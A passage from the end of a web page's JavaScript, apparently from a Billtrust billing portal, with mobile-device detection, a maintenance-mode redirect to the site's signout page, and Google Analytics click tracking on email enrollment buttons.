                    return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
                }
            };
        }
		$(document).ready(function() {

			$(document).ajaxComplete(function(event, xhr, settings) {
				if(xhr.getResponseHeader('X-IG-MaintenanceMode') == 'Y') {
					document.location.href = 'https://secure.billtrust.com/ROMCO/ig/signout';
				}
			});

			
									
			/* Google Analytics tracking for Auto Email Enrollment*/
			
			$("#emailEnrollmentLink").on("click", function() {
				// track click event
				gtag('event', 'click', {
					'event_category': 'button',
					'event_label': 'Email Enrollment Footer Link',
					'value': 1
				});				
			});
			
			$("#auto-email-enrollment-submit").on("click", function() {
				// track click event
				gtag('event', 'click', {
					'event_category': 'button',
					'event_label': 'Email Enrollment Signup',
					'value': 1
				});				
			});
		});
	</script>
</body>
</html>
